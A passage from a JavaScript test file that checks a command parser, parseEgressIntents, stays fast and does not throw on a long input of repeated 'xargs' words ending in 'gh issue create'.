      "xargs ".repeat(N / 6) + "gh issue create",
    ];
    for (const input of inputs) {
      const t = performance.now();
      assert.doesNotThrow(() => parseEgressIntents(input, { ghAliases: new Map([["ic", "issue create"]]) }));
      const ms = performance.now() - t;
      assert.ok(ms < 3000, `${ms.toFixed(0)}ms for ${JSON.stringify(input.slice(0, 40))}…`);
    }
  });
});
